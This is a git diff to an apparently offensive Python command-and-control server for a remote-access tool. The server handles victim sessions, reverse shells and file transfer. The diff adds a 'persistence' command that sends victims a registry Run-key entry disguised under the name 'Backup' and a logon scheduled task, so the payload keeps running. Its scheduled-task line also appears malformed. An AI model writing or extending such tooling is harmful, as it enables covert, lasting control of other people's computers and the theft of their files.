@@ -3,7 +3,6 @@ import json
 import sys
 import time
 import random
-import subprocess
 import threading
 
 HOST = "127.0.0.1" # Address to listen on
@@ -38,7 +37,7 @@ def shell(conn):
     lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a new socket for the reverse shell
     lst.bind((HOST, port))
     lst.listen(1)
-    cn, addr = lst.accept()
+    cn, _ = lst.accept()
     while True:
         #Receive data from the target and get user input
         try:
@@ -133,7 +132,8 @@ if __name__ == '__main__':
                             session <number>: Select the specified session
                             shell: Opens a reverse shell on the target
                             upload <local_file> <destination_path>: Uploads a specified file (absolute local path)
-                            download <remote_file>: Downloads a file from the remote host\n
+                            download <remote_file>: Downloads a file from the remote host
+                            persistence: try to set persistence on the target. Multiple options:\n\tregistry: set persistence in HKCU registry\n\tschtask: set a scheduled task for persistence\n
                         """)
                     
                 case 'sessions': 
@@ -144,7 +144,7 @@ if __name__ == '__main__':
 
                 case 'session':
                     try:
-                        connections[int(parameters[1])][1]
+                        connections[int(parameters[1])][1] # Check if the index is out of range
                     except IndexError as _:
                         print("\033[91m[ERROR] The selected session does not exist\033[0m")
                     else:
@@ -163,9 +163,18 @@ if __name__ == '__main__':
                 case 'quit':
                     res = input("Are you sure you want to quit? [Y/n] ")
                     if res.lower() == 'y': 
-                        quit()
+                        for connection in connections: # Close all the connections
+                            connection[0].close()
+                        quit() # TODO: check why this blows up everything (probably bc of threads)
                     else:
                         pass
+
+                case 'persistence':
+                    print('\033[93m[INFO] Attempting to set up persistence on the target...\033[0m')
+                    if parameters[1] == 'registry': # adds a value to Run in HKCU to run the payload at startup
+                        send_command(connections[session][0], 'command', 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backup /t REG_SZ /d "'+__file__+'"')
+                    elif parameters[1] == 'schtask': # sets a scheduled task which runs at user logon
+                        send_command(connections[session][0], 'command', 'schtasks /create /sc ONLOGON /mo ONLOGON /tn ' + __file__)
 
                 case _:
                     print("\033[93m[INFO] Not a valid command\033[0m")
